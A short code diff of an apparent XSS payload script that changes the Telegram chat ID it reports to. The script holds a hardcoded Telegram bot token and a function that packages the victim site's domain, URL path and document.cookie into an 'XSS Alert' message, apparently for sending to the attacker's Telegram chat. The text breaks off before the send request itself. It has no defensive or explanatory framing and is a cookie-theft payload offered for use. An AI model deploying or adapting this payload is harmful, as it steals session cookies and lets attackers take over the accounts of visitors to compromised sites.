@@ -1,5 +1,5 @@
 var tokenBot = '747566155:AAEuRU1Z98wv2yK5qjQwmpZfkVMKsmeqwo0';
-var chatId = '-1001491366475';
+var chatId = '17479571';
 
 function telegramSend(tokenBot, chatId) {
 	var textData = '<b>XSS+Alert+in+' + document['domain']+'</b>%0d%0a------------------------------------------------%0d%0a%0d%0a<b>-+URL+Target+-</b>%0d%0a<pre>' + document['location']['hostname'] + document['location']['pathname'] + '</pre>%0d%0a%0d%0a<b>-+Document+Cookie+-</b>%0d%0a<pre>' + document['cookie'] + '</pre>';
